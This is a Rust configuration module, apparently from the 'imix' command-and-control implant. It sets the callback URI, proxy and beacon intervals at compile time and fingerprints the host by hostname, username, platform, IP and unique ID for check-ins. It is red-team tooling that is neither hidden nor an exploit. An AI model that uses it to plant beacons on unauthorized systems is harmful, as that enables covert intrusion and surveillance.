use crate::version::VERSION;
use pb::c2::host::Platform;
use uuid::Uuid;

macro_rules! callback_uri {
    () => {
        match option_env!("IMIX_CALLBACK_URI") {
            Some(uri) => uri,
            None => "http://127.0.0.1:80/grpc",
        }
    };
}

/*
 * Compile-time constant for the agent proxy URI, derived from the IMIX_PROXY_URI environment variable during compilation.
 * Defaults to None if this is unset.
 */
macro_rules! proxy_uri {
    () => {
        option_env!("IMIX_PROXY_URI")
    };
}

/*
 * Compile-time constant for the agent callback URI, derived from the IMIX_CALLBACK_URI environment variable during compilation.
 * Defaults to "http://127.0.0.1:80/grpc" if this is unset.
 */
pub const CALLBACK_URI: &str = callback_uri!();

macro_rules! callback_interval {
    () => {
        match option_env!("IMIX_CALLBACK_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent retry interval, derived from the IMIX_RETRY_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const CALLBACK_INTERVAL: &str = callback_interval!();

macro_rules! retry_interval {
    () => {
        match option_env!("IMIX_RETRY_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent callback interval, derived from the IMIX_CALLBACK_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const RETRY_INTERVAL: &str = retry_interval!();

/*
 * Config holds values necessary to configure an Agent.
 */
#[derive(Debug, Clone)]
pub struct Config {
    pub info: pb::c2::Beacon,
    pub callback_uri: String,
    pub proxy_uri: Option<String>,
    pub retry_interval: u64,
}

/*
 * A default configuration for the agent.
 */
impl Default for Config {
    fn default() -> Self {
        let agent = pb::c2::Agent {
            identifier: format!("imix-v{}", VERSION),
        };

        let engines = host_unique::defaults();

        let host = pb::c2::Host {
            name: whoami::fallible::hostname().unwrap_or(String::from("")),
            identifier: host_unique::id(engines).to_string(),
            platform: get_host_platform() as i32,
            primary_ip: get_primary_ip(),
        };

        let info = pb::c2::Beacon {
            identifier: String::from(Uuid::new_v4()),
            principal: whoami::username(),
            interval: match CALLBACK_INTERVAL.parse::<u64>() {
                Ok(i) => i,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to parse callback interval constant, defaulting to 5 seconds: {_err}");

                    5_u64
                }
            },
            host: Some(host),
            agent: Some(agent),
        };

        Config {
            info,
            callback_uri: String::from(CALLBACK_URI),
            proxy_uri: get_system_proxy(),
            retry_interval: match RETRY_INTERVAL.parse::<u64>() {
                Ok(i) => i,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!(
                        "failed to parse retry interval constant, defaulting to 5 seconds: {_err}"
                    );

                    5
                }
            },
        }
    }
}

fn get_system_proxy() -> Option<String> {
    let proxy_uri_compile_time_override = proxy_uri!();
    if let Some(proxy_uri) = proxy_uri_compile_time_override {
        return Some(proxy_uri.to_string());
    }

    #[cfg(target_os = "linux")]
    {
        match std::env::var("http_proxy") {
            Ok(val) => return Some(val),
            Err(_e) => {
                #[cfg(debug_assertions)]
                log::debug!("Didn't find http_proxy env var: {}", _e);
            }
        }

        match std::env::var("https_proxy") {
            Ok(val) => return Some(val),
            Err(_e) => {
                #[cfg(debug_assertions)]
                log::debug!("Didn't find https_proxy env var: {}", _e);
            }
        }
        None
    }
    #[cfg(target_os = "windows")]
    {
        None
    }
    #[cfg(target_os = "macos")]
    {
        None
    }
    #[cfg(target_os = "freebsd")]
    {
        None
    }
}

impl Config {
    pub fn refresh_primary_ip(&mut self) {
        let fresh_ip = get_primary_ip();
        if self
            .info
            .host
            .as_ref()
            .is_some_and(|h| h.primary_ip != fresh_ip)
        {
            match self.info.host.as_mut() {
                Some(h) => {
                    h.primary_ip = fresh_ip;
                }
                None => {
                    #[cfg(debug_assertions)]
                    log::error!("host struct was never initialized, failed to set primary ip");
                }
            }
        }
    }
}

/*
 * Returns which Platform imix has been compiled for.
 */
fn get_host_platform() -> Platform {
    #[cfg(target_os = "linux")]
    return Platform::Linux;

    #[cfg(target_os = "macos")]
    return Platform::Macos;

    #[cfg(target_os = "windows")]
    return Platform::Windows;

    #[cfg(any(target_os = "freebsd", target_os = "netbsd", target_os = "openbsd"))]
    return Platform::Bsd;

    #[cfg(all(
        not(target_os = "linux"),
        not(target_os = "macos"),
        not(target_os = "windows"),
        not(target_os = "freebsd"),
        not(target_os = "netbsd"),
        not(target_os = "openbsd"),
    ))]
    return Platform::Unspecified;
}

/*
 * Return the first IPv4 address of the default interface as a string.
 * Returns the empty string otherwise.
 */
fn get_primary_ip() -> String {
    match default_net::get_default_interface() {
        Ok(default_interface) => match default_interface.ipv4.first() {
            Some(ip) => ip.addr.to_string(),
            None => String::from(""),
        },
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!("failed to get primary ip: {_err}");

            String::from("")
        }
    }
}
